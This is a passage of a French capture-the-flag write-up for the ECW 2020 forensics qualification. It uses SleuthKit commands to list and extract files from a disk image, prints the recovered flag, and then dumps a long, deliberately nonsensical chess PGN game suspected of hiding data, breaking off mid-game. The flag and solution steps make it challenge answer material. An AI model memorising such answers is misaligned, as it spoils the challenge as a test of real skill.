Slot Start End Length Description 000: Meta 0000000000 0000000000 0000000001 Primary Table (#0) 001: ------- 0000000000 0000002047 0000002048 Unallocated 002: 000:000 0000002048 0001957887 0001955840 NTFS / exFAT (0x07) Je d\u00e9couvre 3 partitions, dont une plus importante que les autres, la num\u00e9ro \"002\" qui contient un syst\u00e8me de fichier NTFS. Je d\u00e9cide de regarder ce quelle contient : onosh@siftworkstation:# fls -o 0000002048 -r -p Raw1.dd |grep -v '\\$' d/d 36-144-1: System Volume Information r/r 38-128-1: System Volume Information/IndexerVolumeGuid r/r 37-128-1: System Volume Information/WPSettings.dat -/r * 64-128-2: Flag.txt -/r * 65-128-2: Meow.pdf -/r * 66-128-2: Wiki.pdf -/d * 67-144-2: MrNigloR-S01 -/r * 68-128-2: MrNigloR-S01/MrNigloR-S01-ep1-VOST.mp4 -/r * 69-128-2: MrNigloR-S01/MrNigloR-S01-ep1.mp4 -/d * 70-144-2: PgnChessBook -/r * 71-128-2: PgnChessBook/Install_PgnChessBook.exe -/r * 72-128-2: PgnChessBook/READ_ME_FIRST.txt -/r * 73-128-2: PgnChessBook/my_best_game.pgn Un fichier \"Flag.txt\" int\u00e9ressant... \u00e7a semble \u00eatre ce que l'on cherche vu notre piste de recherche ! J'extrait le fichier : onosh@siftworkstation:# icat -o 0000002048 Raw1.dd 64-128-2 >flag.txt && cat flag.txt ECW{59b931696910632cd89986ccbf626e388055477e} J'ai mon premier flag ! ECW{59b931696910632cd89986ccbf626e388055477e} + 50 points","title":"Lord of War 1/4"},{"location":"ctf/ecw2020/forensicqualification/#lord-of-war-24","text":"Piste de recherche : WALLET Cette fois ci, on recherche quelque chose en rapport avec \"Wallet\" : Portefeuille Cryptomonnaie Bitcoin, Ethereum ? Je commence par chercher le mot cl\u00e9 dans l'image disque, mais sans succ\u00e8s : onosh@siftworkstation:# grep -rina 'WALLET' Raw1.dd onosh@siftworkstation:# strings Raw1.dd |grep -in 'wallet' Je d\u00e9cide donc d'approndir ma recherche dans les autres fichiers trouv\u00e9 pr\u00e9cemment ! J'ai \u00e0 ma disposition : 2 fichiers PDF 2 Vid\u00e9os Un jeu d'\u00e9chec Apr\u00e8s quelques recherches dans le fichier PDF et les vid\u00e9os, aucune information semble pertinente pour cette piste \"Wallet\", je d\u00e9cide d'\u00e9plucher le jeu d'\u00e9chec. Le fichier PgnChessBook/READ_ME_FIRST.txt nous apprend qu'il est possible \u00e0 partir du programme PgnChessBook/Install_PgnChessBook.exe d'importer une partie d'\u00e9chec si elle est au format .pgn, \u00e7a tombe bien nous avons le fichier PgnChessBook/my_best_game.pgn . J'\u00e9x\u00e9cute le programme et j'importe le fichier : Apr\u00e8s quelques tests de simulation de la partie, on se rend vite compte qu'elle n'a aucun sens car les deux joueurs placent leurs pions n'importe comment. Les donn\u00e9es contenue dans le fichier my_best_game.pgn semblent d'autant plus \u00e9trange : 1. g3 h5 2. h4 Nh6 3. d3 g5 4. a3 b6 5. Nh3 a5 6. Rh2 d5 7. c3 b5 8. Bg2 Na6 9. g4 Qd6 10. Bh1 Qg3 11. c4 Ng8 12. hxg5 Qxh3 13. Qb3 Bd7 14. e3 Bc6 15. Nc3 Bh6 16. Be4 Qf3 17. Rh1 Qxf2+ 18. Kxf2 e5 19. d4 dxe4 20. Na2 f5 21. Qd3 Ra7 22. Nb4 hxg4 23. Ke2 a4 24. Rd1 Bb7 25. Nc6 Kf8 26. Rh1 Nf6 27. Ke1 Nb4 28. Qe2 Na6 29. Nb4 Ba8 30. Rh2 Bb7 31. Qc2 Bc8 32. Qf2 Bxg5 33. Qh4 c5 34. Qh7 Rhxh7 35. Na2 Ra8 36. Kd1 Bb7 37. Bd2 Re7 38. cxb5 Nd5 39. Rh5 Rc8 40. Rh2 Kg7 41. Bc1 Bh6 42. Re2 Ree8 43. Kd2 g3 44. Rh2 Nf6 45. Rh3 Kg6 46. Kc3 Rc6 47. Kc2 Rf8 48. Nc3 Ne8 49. Rh5 Bc8 50. Rxh6+ Kf7 51. dxe5 Nb4+ 52. axb4 cxb4 53. Kb1 b3 54. e6+ Kg8 55. Nd5 f4 56. Rh1 Ba6 57. exf4 Rc2 58. Nc3 Kg7 59. Be3 Rc1+ 60. Bxc1 Nf6 61. Nxa4 Bc8 62. Rh8 Rf7 63. Rh2 Re7 64. Rf2 Rf7 65. Rh2 Nh7 66. Rxh7+ Kf8 67. Nc5 Rxf4 68. Rh6 Bb7 69. Ra7 Rf3 70. e7+ Ke8 71. Rh5 Bd5 72. Nd7 Be6 73. Rh3 Bg8 74. Ka1 Rf6 75. Rh2 Bd5 76. Ne5 Rf1 77. Nf7 Bc6 78. Ra4 Rxf7 79. Ra2 Rxe7 80. bxc6 Rh7 81. Rxh7 Kf8 82. Bh6+ Ke8 83. Ra5 Kd8 84. Rg5 Ke8 85. c7 e3 86. Rd7 e2 87. Rg8+ Kxd7 88. Re8 e1=B 89. c8=B+ Kc6 90. Rxe1 Kd5 91. Bf8 Kd4 92. Be7 Kd5 93. Re3 Kd4 94. Rxb3 g2 95. Rc3 Ke5 96. Ba6 g1=B 97. b4 Bc5 98. Rc1 Bd4+ 99. Ka2 Ke4 100. b5 Ba1 101. Rc5 Bh8 102. Kb3 Kd3 103. Kb4 Kd4 104. Ka5 Ke3 105. Bb7 Bf6 106. Ba6 Bg5 107. Ka4 Kd4 108. Rc3 Ke5 109. Rd3 Bd2 110. Rg3 Bg5 111. Ka3 Kd5 112. Bb4 Bh6 113. Rg7 Bd2 114. Ka2 Be1 115. Be7 Ba5 116. Bf8 Ke6 117. Be7 Bd8 118. Kb2 Bb6 119. Bg5 Bg1 120. Bd8 Kf5 121. Ka2 Be3 122. Rb7 Ba7 123. Kb1 Bb6 124. Rb8 Bg1 125. Kc1 Bf2 126. b6 Be3+ 127. Kd1 Bf4 128. Bb7 Ke5 129. Ra8 Ke6 130. Bh1 Bh2 131. Ra3 Bg1 132. Ra7 Be3 133. Bf6 Bh6 134. Ra3 Bf4 135. Bg2 Bc7 136. Ra8 Bxb6 137. Ra4 Ba5 138. Bd4 Bc3 139. Kc1 Ba5 140. Bh1 Kd6 141. Bc5+ Kd7 142. Bd5 Bb4 143. Bb3 Bd2+ 144. Kb2 Ke8 145. Bd5 Bh6 146. Kb3 Kd7 147. Be4 Bc1 148. Be3 Ke6 149. Ba7 Ke5 150. Be3 Bd2 151. Bf2 Ke6 152. Be3 Ba5 153. Rc4 Kd7 154. Bc6+ Ke7 155. Re4+ Kf8 156. Bb5 Bc7 157. Bf4 Kg7 158. Bg3 Kf6 159. Ka4 Be5 160. Ba6 Kg5 161. Ka5 Kf6 162. Bc8 Kg5 163. Bh4+ Kh6 164. Kb4 Bc3+ 165. Kc4 Bh8 166. Bf6 Kg6 167. Re2 Bxf6 168. Bf5+ Kh6 169. Bh3 Kg7 170. Kb5 Bg5 171. Re1 Kh6 172. Ka4 Kg6 173. Re4 Bf6 174. Bf1 Kg7 175. Rb4 Be5 176. Rb3 Bd6 177. Kb5 Kf8 178. Rb4 Be7 179. Bc4 Bd8 180. Bg8 Be7 181. Kc6 Bh4 182. Ra4 Ke8 183. Kc5 Bd8 184. Bd5 Bb6+ 185. Kb4 Ba7 186. Kc3 Bf2 187. Kd2 Kd8 188. Bb7 Ke8 189. Kc2 Kf8 190. Rd4 Ke8 191. Ra4 Ke7 192. Kc1 Bb6 193. Bf3 Ke6 194. Kc2 Kf6 195. Bd5 Ba7 196. Rg4 Bd4 197. Rxd4 Ke5 198. Rd1 Kf4 199. Rc1 Ke5 200. Kc3 Kf4 201. Kd4 Kf5 202. Rd1 Kg4 203. Ra1 Kh5 204. Kc3 Kg4 205. Bg8 Kf5 206. Ra4 Ke5 207. Ra3 Ke4 208. Ba2 Ke5 209. Bf7 Kf4 210. Bc4 Kg3 211. Ra8 Kh3 212. Bd5 Kg4 213. Bh1 Kf5 214. Rg8 Kf6 215. Bg2 Ke5 216. Rg7 Kf4 217. Kc2 Ke5 218. Kb2 Kd6 219. Rg8 Kd7 220. Bf1 Kc6 221. Bc4 Kc5 222. Ka2 Kd6 223. Ka3 Ke5 224. Bd5 Kf6 225. Ba8 Ke5 226. Rg5+ Kf4 227. Be4 Ke3 228. Bf3 Kd4 229. Rg8 Kc3 230. Ka2 Kc4 231. Kb2 Kb4 232. Be2 Ka5 233. Rb8 Ka4 234. Bf3 Ka5 235. Kb1 Ka6 236. Rb7 Ka5 237. Be2 Ka4 238. Rb4+ Ka5 239. Ka1 Kxb4 240. Bb5 Kb3 241. Bd7 Kc4 242. Ba4 Kc5 243. Ka2 Kd5 244. Kb1 Kd4 245. Be8 Ke4 246. Ka1 Kf3 247. Bd7 Kg2 248. Ba4 Kg1 249. Bd1 Kg2 250. Kb1 Kg1 251. Bg4 Kh2 252. Ka1 Kh1 253. Bh3 Kh2 254. Bf1 Kg3 255. Bb5 Kh2 256. Ka2 Kg1 257. Kb1 Kf2 258. Ba4 Ke1 259. Bd7 Kf1 260. Bc6 Kf2 261. Ba4 Kg3 262. Bb5 Kh3 263. Bd7+ Kh4 264. Ka2 Kh5 265. Bb5 Kg4 266. Be2+ Kh4 267. Kb3 Kg5 268. Bf3 Kf4 269. Ka4 Ke5 270. Ba8 Kd4 271. Be4 Ke5 272. Bh7 Kf6 273. Bg6 Ke6 274. Bb1 Kd6 275. Ka5 Kc7 276. Bg6 Kd7 277. Be8+ Kc8 278. Ba4 Kd8 279. Kb4 Kc7 280. Bc2 Kb8 281. Kc3 Ka8 282. Kd2 Kb8 283. Ke1 Ka8 284. Kf2 Kb7 285. Kg1 Ka6 286. Kh1 Kb6 287. Bf5 Kb7 288. Kg1 Ka8 289. Bg4 Kb7 290. Kf2 Kb8 291. Kf1 Kb7 292. Bf3+ Ka7 293. Bh1 Kb8 294. Kg1 Kc8 295. Bg2 Kb8 296. Kf2 Ka7 297. Bh1 Kb6 298. Bd5 Ka7 299. Be6 Ka8 300. Bg8 Kb8 301. Bh7 Kc8 302. Ke3 Kd8 303. Bb1 Ke8 304. Kd4 Kd7 305. Kd5 Kc7 306. Kc5 Kb8 307. Kb4 Ka8 308. Kc4 Ka7 309. Bf5 Ka6 310. Kb4 Kb7 311. Ka4 Kb8 312. Kb5 Ka7 313. Bh3 Kb8 314. Kc4 Kb7 315. Kd5 Ka6 316. Be6 Ka5 317. Bg8 Ka6 318. Ke6 Kb5 319. Kd6 Kb4 320. Kd5 Ka4 321. Ke5 Kb4 322. Bf7 Ka5 323. Kf5 Kb4 324. Kg6 Ka3 325. Kh7 Ka4 326. Be6 Ka3 327. Kg7 Kb2 328. Bd5 Kc1 329. Bc4 Kd1 330. Kh7 Kc1 331. Bg8 Kd2 332. Kh8 Kc1 333. Kg7 Kd2 334. Ba2 Ke3 335. Bg8 Kf2 336. Bc4 Kg1 337. Ba2 Kf1 338. Kh6 Ke1 339. Kh7 Kd1 340. Kg6 Kc1 341. Kh6 Kd1 342. Bf7 Kc1 343. Bg6 Kb2 344. Be4 Kb3 345. Bf5 Ka4 346. Bc8 Kb3 347. Bf5 Ka3 348. Kg5 Kb4 349. Kf4 Ka4 350. Ke5 Ka3 351. Kf6 Ka2 352. Ke6 Kb2 353. Bh3 Kb1 354. Ke5 Kb2 355. Ke4 Ka3 356. Ke5 Kb3 357. Bg2 Ka3 358. Be4 Kb2 359. Kd6 Kc3 360. Kd7 Kc4 361. Bg2 Kd4 362. Bh1 Kc4 363. Ba8 Kb5 364. Ke7 Kb4 365. Bd5 Kc3 366. Ke8 Kd3 367. Ke7 Kd4 368. Be6 Ke3 369. Ba2 Kf3 370. Bd5+ Ke3 371. Bh1 Kd2 372. Kf7 Kd1 373. Ke7 Kd2 374. Kf6 Kd3 375. Bb7 Kd4 376. Kg7 Kc3 377. Kh6 Kb3 378. Bd5+ Ka4 379. Bf3 Ka5 380. Be4 Ka4 381. Bh7 Kb5 382. Bd3+ Kb6 383. Bg6 Ka7 384. Be4 Kb6 385. Kg6 Ka6 386. Bb1 Kb5 387. Bd3+ Kb4 388. Kg7 Ka3 389. Bh7 Kb2 390. Be4 Ka1 391. Bg2 Ka2 392. Kh8 Kb1 393. Kg8 Kc1 394. Be4 Kb2 395. Bf5 Kc3 396. Bd7 Kc2 397. Be6 Kd1 398. Bb3+ Kc1 399. Ba4 Kb2 400. Bc2 Kc1 401. Bd3 Kd2 402. Kg7 Kxd3 403. Kf7 Kc4 404. Kf6 Kc3 405. Kg6 Kd4 406. Kf7 Ke3 407. Ke8 Kf2 408. Ke7 Kg2 409. Kd8 Kf3 410. Ke8 Ke4 411. Kf7 Kf3 412. Kf8 Ke4 413. Ke8 Kd3 414. Kd7 Kc4 415. Ke8 Kc5 416. Ke7 Kd4 417. Ke8 Kd5 418. Kf7 Kc6 419. Kg7 Kb5 420. Kf7 Kc4 421. Kf6 Kb3 422. Kf5 Kb2 423. Kf4 Ka2 424. Ke3 Kb3 425. Kf3 Kc4 426. Ke4 Kc5 427. Kf3 Kd5 428. Ke3 Ke5 429. Kf3 Kd4 430. Kg4 Ke4 431. Kg3 Ke3 432. Kh3 Kf4 433. Kg2 Kf5 434. Kh1 Kf4 435. Kg1 Ke5 436. Kh2 Kf5 437. Kh1 Kg5 438. Kg1 Kh6 439. Kg2 Kg6 440. Kf3 Kh7 441. Ke3 Kg6 442. Kf3 Kf6 443. Kg2 Kf5 444. Kh1 Ke6 445. Kh2 Kd5 446. Kh1 Kc4 447. Kh2 Kb5 448. Kg3 Ka6 449. Kf4 Ka5 450. Ke5 Kb5 451. Kf6 Kc6 452. Kg5 Kc7 453. Kf5 Kd6 454. Kf6 Kc5 455. Ke7 Kd4 456. Kd6 Kd3 457. Kd7 Kd2 458. Kd6 Kc2 459. Kc7 Kb1 460. Kc8 Kc2 461. Kc7 Kb1 462. Kc6 Kc1 463. Kb5 Kb1 464. Ka5 Ka2 465. Kb4 Kb2 466. Ka4 Kb1 467. Ka5 Kc2 468. Ka4 Kc1 469. Ka3 Kd2 470. Kb3 Ke2 471. Ka2 Kd3 472. Ka3 Kd4 473. Ka2 Ke3 474. Kb1 Kf2 475. Kc2 Kf1 476. Kb2 Kg2 477. Ka1 Kh2 478. Ka2 Kg3 479. Kb3 Kg2 480. Kc4 Kh3 481. Kd4 Kh2 482. Kc5 Kg3 483. Kb6 Kf2 484. Kb5 Kf1 485. Kb4 Kg1 486. Ka4 Kh2 487. Kb4 Kg2 488. Kb5 Kg3 489. Ka5 Kh2 490. Ka4 Kh3 491. Kb5 Kg2 492. Ka6 Kf3 493. Ka7 Ke3 494. Kb7 Ke2 495. Ka8 Ke3 496. Ka7 Kd4 497. Ka8 Kc4 498. Ka7 Kb3 499. Kb8 Kb4 500. Kc7 Ka3 501. Kd6 Kb3 502. Kc5 Kb2 503. Kb6 Ka3 504. Kc7 Kb2 505. Kc6 Kc3 506. Kd6 Kb3 507. Ke6 Ka2 508. Kd6 Kb3 509. Kc5 Kc2 510. Kd5 Kb3 511. Kc5 Ka2 512. Kb6 Ka1 513. Ka6 Kb1 514. Kb5 Kc1 515. Ka5 Kd2 516. Kb4 Kd3 517. Kb3 Ke4 518. Kc3 Ke5 519. Kb2 Kd6 520. Kc2 Kd5 521. Kb2 Kc6 522. Ka1 Kd6 523. Kb2 Ke7 524. Kc2 Kd6 525. Kc1 Ke5 526. Kd2 Kf5 527. Ke2 Kg4 528. Ke1 Kg5 529. Kf2 Kf6 530. Kg3 Kg6 531. Kf2 Kh7 532. Kf3 Kg7 533. Kf4 Kf6 534. Kf3 Kf7 535. Ke4 Ke6 536. Kd4 Kf7 537. Kd5 Kg6 538. Ke5 Kh7 539. Kd5 Kh6 540. Ke4 Kg6 541. Kd3 Kg7 542. Kc3 Kg8 543. Kb4 Kg7 544. Ka5 Kf7 545. Ka4 Ke8 546. Kb4 Kf8 547. Kc5 Ke8 548. Kd6 Kf8 549. Kc5 Ke8 550. Kc6 Kf8 551. Kb5 Kg7 552. Kb6 Kh8 553. Kb7 Kg8 554. Ka8 Kh7 555. Kb7 Kg7 556. Kc6 Kh8 557. Kb6 Kg7 558. Ka7 Kg8 559. Kb6 Kf8 560. Kc7 Ke7 561. Kc8 Ke8 562. Kb7 Kf7 563. Kc6 Ke6 564. Kb7 Kf7 565. Kc7 Kg8 566. Kd7 Kf7 567. Kc7 Ke6 568. Kc6 Kf6 569. Kc5 Kg5 570. Kb6 Kf4 571. Kc5 Kf5 572. Kc4 Ke5 573. Kb3 Kd5 574. Ka2 Kc5 575. Kb2 Kb4 576. Ka1 Ka5 577. Kb1 Ka4 578. Kc2 Kb4 579. Kb1 Ka4 580. Kc2 Kb4 581. Kb2 Kc5 582. Ka3 Kc6 583. Kb4 Kc7 584. Ka5 Kb7 585. Kb4 Ka6 586. Kb3 Kb5 587. Kc2 Ka5 588. Kb2 Ka4 589. Kc3 Kb5 590. Kb2 Ka4 591. Ka2 Kb5 592. Ka3 Ka5 593. Kb3 Kb6 594. Kc2 Ka7 595. Kc3 Ka8 596. Kc4 Kb7 597. Kc3 Ka6 598. Kc4 Kb7 599. Kd5 Ka7 600. Ke4 Kb8 601. Ke5 Kb7 602. Kd5 Ka8 603. Ke6 Ka7 604. Kd6 Ka8 605. Kd7 Kb7 606. Kd6 Kb6 607. Ke6 Ka6 608. Kf6 Ka5 609. Kf5 Kb5 610. Ke4 Ka5 611. Kf4 Kb5 612. Kf3 Ka6 613. Kg2 Kb6 614. Kf3 Kc6 615. Kf2 Kd6 616. Ke2 Ke6 617. Ke1 Kf5 618. Kd1 Kg6 619. Kd2 Kg7 620. Kd1 Kf6 621. Kc2 Ke5 622. Kb2 Kf5 623. Ka2 Ke6 624. Kb1 Ke5 625. Ka2 Kd5 626. Ka1 Ke4 627. Ka2 Ke3 628. Ka1 Kf2 629. Kb2 Ke1 630. Ka1 Kd2 631. Ka2 Ke3 632. Kb2 Kd2 633. Ka1 Kd1 634. Ka2 Kc1 635. Ka3 Kd1 636. Kb3 Kc1 637. Ka2 Kd2 638. Ka3 Kc3 639. Ka2 Kd2 640. Kb3 Kd3 641. Ka2 Ke3 642. Kb3 Kd4 643. Kc2 Ke5 644. Kb2 Kf6 645. Kc2 Ke7 646. Kb1 Kf6 647. Kb2 Kg7 648. Ka1 Kh7 649. Kb2 Kg6 650. Kb1 Kh5 651. Kc1 Kg6 652. Kb1 Kg5 653. Kb2 Kh6 654. Kc2 Kh7 655. Kd2 Kh8 656. Kd3 Kg8 657. Kd2 Kh8 658. Kc3 Kg8 659. Kb4 Kf7 660. Kb5 Kg8 661. Ka5 Kg7 662. Kb6 Kg6 663. Kc7 Kh6 664. Kb8 Kh5 665. Ka8 Kg6 666. Kb7 Kh6 667. Kc8 Kg6 668. Kb7 Kf6 669. Kc6 Kf5 670. Kb6 Kf6 671. Kc6 Ke6 672. Kc7 Kd5 673. Kb7 Ke5 674. Ka8 Ke6 675. Kb8 Kd5 676. Kc8 Ke5 677. Kd7 Kf4 678. Ke8 Kg5 679. Kf8 Kh6 680. Ke7 Kg5 681. Kd8 Kf6 682. Kd7 Kg6 683. Ke6 Kg7 684. Ke5 Kf7 685. Ke4 Kf8 686. Kd3 Ke7 687. Ke3 Kd8 688. Kf2 Kc8 689. Kf3 Kb8 690. Kf2 Ka8 691. Kg3 Ka7 692. Kf3 Kb7 693. Kf2 Kc6 694. Ke2 Kb5 695. Kf2 Kb6 696. Kg1 Kb7 697. Kf1 Ka6 698. Kg1 Kb5 699. Kh2 Kb4 700. Kg1 Ka4 701. Kg2 Ka5 702. Kh3 Kb4 703. Kh4 Kb5 704. Kg3 Kc5 705. Kg4 Kd5 706. Kf4 Kc6 707. Kg3 Kb6 708. Kh2 Ka7 709. Kh3 Kb6 710. Kg4 Kb5 711. Kh3 Ka6 712. Kg2 Ka5 713. Kg1 Kb4 714. Kh1 Ka3 715. Kh2 Kb4 716. Kh1 Kc5 717. Kg1 Kd4 718. Kf1 Kc4 719. Ke1 Kc3 720. Kd1 Kb3 721. Ke2 Kb2 722. Kf3 Ka3 723. Kg3 Kb4 724. Kf3 Ka3 725. Kf4 Kb2 726. Kf3 Kb3 727. Kg2 Ka4 728. Kh2 Kb3 729. Kg3 Ka2 730. Kf2 Ka3 731. Ke3 Ka2 732. Kf2 Kb3 733. Kg3 Kb4 734. Kg2 Kb5 735. Kf2 Kb6 736. Kg1 Ka5 737. Kf1 Kb5 738. Kf2 Kc6 739. Kf1 Kd5 740. Kf2 Kc4 741. Kg3 Kc3 742. Kf3 Kb2 743. Kg4 Kc3 744. Kh3 Kd3 745. Kg3 Ke4 746. Kh3 Kd3 747. Kg3 Ke4 748. Kf2 Kf5 749. Ke3 Kg5 750. Kd2 Kh6 751. Ke3 Kg7 752. Kf3 Kf8 753. Ke3 Ke8 754. Ke2 Ke7 755. Kd2 Kf6 756. Kd1 Ke7 757. Kc1 Kf7 758. Kb2 Ke7 759. Kb3 Kd8 760. Kc3 Kd7 761. Kd3 Ke7 762. Ke3 Kd6 763. Kf2 Kd5 764. Kf1 Kc5 765. Kf2 Kc6 766. Kf1 Kb6 767. Kg1 Kb7 768. Kh2 Kc7 769. Kh3 Kb8 770. Kg3 Kc8 771. Kg4 Kb8 772. Kh5 Kc8 773. Kh6 Kb8 774. Kg6 Ka7 775. Kh6 Kb8 776. Kg6 Kc7 777. Kh5 Kc6 778. Kg6 Kc5 779. Kg5 Kc4 780. Kh6 Kd5 781. Kg7 Kc4 782. Kg8 Kb5 783. Kh8 Kb6 784. Kg7 Ka7 785. Kh7 Kb6 786. Kg7 Kc6 787. Kf8 Kd6 788. Kf7 Kc5 789. Kg8 Kd6 790. Kf7 Kc7 791. Kg7 Kb8 792. Kh7 Ka8 793. Kh6 Kb8 794. Kh5 Ka8 795. Kg4 Kb7 796. Kh5 Kb6 797. Kg6 Ka5 798. Kf6 Ka6 799. Ke7 Kb6 800. Kd6 Ka6 801. Ke6 Kb5 802. Kd5 Ka5 803. Kc4 Kb6 804. Kd3 Ka5 805. Kc3 Kb6 806. Kc4 Kc6 807. Kb3 Kc7 808. Ka3 Kb8 809. Kb2 Ka8 810. Kc1 Ka7 811. Kb2 Kb6 812. Ka3 Kb7 813. Ka4 Kc7 814. Kb5 Kc8 815. Kb6 Kd8 816. Kb7 Kd7 817. Ka8 Ke8 818. Ka7 Ke7 819. Ka8 Kf8 820. Ka7 Ke8 821. Ka6 Ke7 822. Kb5 Kd6 823. Kb4 Kd7 824. Kb5 Kd8 825. Ka6 Ke8 826. Ka5 Ke7 827. Kb6 Kd8 828. Ka7 Kc8 829. Ka8 Kc7 830. Ka7 Kd7 831. Kb7 Kd8 832. Ka6 Ke7 833. Kb5 Kf8 834. Ka6 Ke8 835. Ka7 Kd7 836. Ka8 Kc8 837. Ka7 Kc7 838. Ka6 Kd8 839. Ka7 Kc7 840. Ka8 Kc6 841. Kb8 Kc5 842. Kc7 Kd4 843. Kc8 Kc4 844. Kd8 Kc3 845. Kc7 Kd2 846. Kd7 Kd3 847. Ke6 Kd4 848. Kf7 Ke3 849. Kg8 Kd3 850. Kf7 Kd2 851. Kf8 Kc3 852. Kg7 Kd3 853. Kh8 Kc3 854. Kg8 Kc4 855. Kh7 Kb5 856. Kh6 Kc6 857. Kg6 Kd6 858. Kg7 Kc7 859. Kf8 Kc6 860. Kg8 Kd7 861. Kg7 Kd8 862. Kf8 Kc7 863. Kg8 Kb8 864. Kh7 Kc8 865. Kh8 Kb8 866. Kh7 Kc7 867. Kg7 Kb7 868. Kf6 Kc8 869. Ke7 Kb8 870. Kd7 Kb7 871. Kd6 Kb8 872. Kc6 Kc8 873. Kb5 Kb7 874. Kc5 Kb8 875. Kd5 Ka7 876. Kc6 Kb8 877. Kd5 Kc7 878. Kc5 Kd7 879. Kd5 Ke7 880. Kc4 Kf7 881. Kc5 Ke8 882. Kc4 Ke7 883. Kb4 Kd8 884. Ka3 Kd7 885. Kb4 Kc7 886. Kb3 Kb6 887. Kb4 Kc6 888. Kc3 Kb6 889. Kc2 Kc7 890. Kc3 Kb6 891. Kb3 Kc6 892. Ka2 Kd6 893. Kb3 Ke5 894. Ka4 Ke4 895. Ka5 Kf3 896. Ka6 Kg2 897. Kb7 Kh2 898. Kb6 Kg1 899. Kb5 Kg2 900. Kc5 Kh2 901. Kb5 Kg3 902. Kc5 Kf2 903. Kb4 Kf3 904. Ka5 Kg3 905. Kb6 Kf4 906. Kc6 Kf5 907. Kb7 Ke5 908. Ka6 Kd6 909. Kb6 Kd7 910. Ka5 Kd6 911. Kb6 Kd7 912. Ka6 Ke7 913. Kb5 Ke6 914. Ka5 Kd6 915. Kb6 Ke7 916. Kc5 Ke8 917. Kc6 Kd8 918. Kb7 Kd7 919. Ka8 Kd8 920. Ka7 Kc7 921. Ka8 Kb6 922. Kb8 Ka5 923. Kc7 Ka6 924. Kc8 Kb6 925. Kd8 Kb7 926. Kd7 Ka7 927. Kc8 Ka6 928. Kd8 Ka7 929. Kc7 Ka8 930. Kc6 Ka7 931. Kd7 Kb7 932. Ke6 Ka8 933. Ke7 Ka7 934. Kf8 Kb6 935. Ke8 Kc6 936. Kf7 Kb7 937. Ke6 Ka6 938. Ke5 Ka7 939. Ke6 Ka6 940. Kd5 Kb5 941. Ke6 Kc5 942. Kf7 Kd5 943. Kg8 Kc6 944. Kg7 Kb7 945. Kg6 Kc7 946. Kh7 Kb6 947. Kg8 Kc5 948. Kh8 Kd6 949. Kg7 Kc7 950. Kg6 Kd8 951. Kg5 Kc7 952. Kh4 Kb7 953. Kg4 Ka6 954. Kh5 Ka7 955. Kg4 Ka8 956. Kf4 Ka7 957. Kg4 Ka8 958. Kh5 Kb7 959. Kh6 Kc7 960. Kg5 Kb7 961. Kf5 Ka6 962. Kg4 Kb5 963. Kg3 Kb6 964. Kh2 Kc7 965. Kh1 Kc8 966. Kg2 Kb8 967. Kg3 Ka7 968. Kg2 Kb6 969. Kg3 Kc5 970. Kh4 Kc6 971. Kg3 Kc7 972. Kh2 Kd6 973. Kg3 Ke6 974. Kf3 Kd6 975. Kg2 Kc6 976. Kf2 Kc5 977. Kg3 Kd4 978. Kh2 Ke4 979. Kg2 Ke5 980. Kh1 Kd4 981. Kg2 Kc4 982. Kg3 Kc3 983. Kf2 Kc4 984. Ke2 Kd4 985. Kd2 Kc4 986. Kc1 Kb4 987. Kd2 Kb3 988. Kd1 Kc4 989. Ke2 Kb5 990. Kd2 Ka5 991. Kc1 Kb6 992. Kb2 Ka5 993. Ka3 Kb5 994. Kb3 Kc5 995. Ka4 Kd5 996. Kb4 Ke6 997. Ka5 Kd6 998. Kb6 Kd5 999. Ka7 Kc4 1000. Ka8 Kc5 1001. Kb8 Kd4 1002. Kb7 Kc3 1003. Ka8 Kb2 1004. Kb8 Kc2 1005. Kc8 Kd1 1006. Kb8 Kc2 1007. Ka7 Kd3 1008. Kb8 Ke4 1009. Kc8 Kf4 1010. Kb7 Kg4 1011. Kc7 Kh4 1012. Kb8 Kg3 1013. Ka8 Kh3 1014. Ka7 Kh4 1015. Kb6 Kg4 1016. Ka7 Kf3 1017. Kb8 Kg4 1018. Kb7 Kg3 1019. Kc7 Kf2 1020. Kd7 Ke1 1021. Kd8 Ke2 1022. Kd7 Kd3 1023. Kc8 Kd2 1024. Kd8 Kc2 1025. Kc7 Kc1 1026. Kb7 Kb1 1027. Kb6 Kb2 1028. Kc7 Kb3 1029. Kb7 Ka2 1030. Ka8 Ka3 1031. Ka7 Kb2 1032. Kb8 Ka1 1033. Kb7 Kb2 1034. Ka6 Kc1 1035. Ka5 Kb1 1036. Kb5 Kc1 1037. Ka6 Kc2 1038. Kb7 Kd3 1039. Kc6 Kc2 1040. Kb6 Kd2 1041. Kb5 Kc3 1042. Ka4 Kd4 1043. Ka5 Kd5 1044. Kb6 Ke6 1045. Kc7 Kf6 1046. Kd6 Kg6 1047. Kc6 Kf6 1048. Kb6 Kg7 1049. Kc6 Kh8 1050. Kc5 Kg8 1051. Kc6 Kg7 1052. Kb5 Kh6 1053. Ka6 Kg6 1054. Ka7 Kh5 1055. Kb7 Kg4 1056. Kb8 Kh3 1057. Ka7 Kh4 1058. Kb8 Kg5 1059. Kc7 Kh6 1060. Kd6 Kg7 1061. Ke7 Kg8 1062. Kd8 Kf8 1063. Kc7 Ke8 1064. Kc8 Ke7 1065. Kb7 Kf8 1066. Ka8 Ke8 1067. Kb7 Kd8 1068. Ka7 Ke7 1069. Kb6 Kd7 1070. Kb5 Kd6 1071. Kb4 Kc7 1072. Ka5 Kb8 1073. Kb6 Kc8 1074. Kc6 Kb8 1075. Kd6 Kc8 1076. Kc6 Kb8 1077. Kb6 Ka8 1078. Kb5 Ka7 1079. Kc6 Kb8 1080. Kd6 Kc8 1081. Kd5 Kd8 1082. Ke6 Ke8 1083. Ke5 Ke7 1084. Kf4 Kf7 1085. Kf3 Ke7 1086. Ke4 Kd7 1087. Ke5 Kc6 1088. Kf4 Kd7 1089. Kf5 Kd6 1090. Kf6 Kd7 1091. Kf5 Kd8 1092. Kg6 Kc7 1093. Kh7 Kd6 1094. Kg7 Ke5 1095. Kf8 Ke4 1096. Ke7 Kf3 1097. Kf7 Kg3 1098. Kf8 Kh3 1099. Ke8 Kh2 1100. Kf8 Kg1 1101. Ke8 Kh1 1102. Kd8 Kg1 1103. Kc8 Kf1 1104. Kc7 Kg2 1105. Kd7 Kf1 1106. Kc7 Ke1 1107. Kb8 Kf2 1108. Ka8 Kg1 1109. Kb7 Kf1 1110. Kb8 Ke1 1111. Ka7 Kd1 1112. Kb8 Kd2 1113. Kc7 Kc3 1114. Kb6 Kd3 1115. Ka6 Kc3 1116. Ka7 Kd2 1117. Kb8 Kc3 1118. Ka8 Kb2 1119. Ka7 Ka1 1120. Kb7 Kb1 1121. Ka6 Ka2 1122. Kb6 Kb2 1123. Ka7 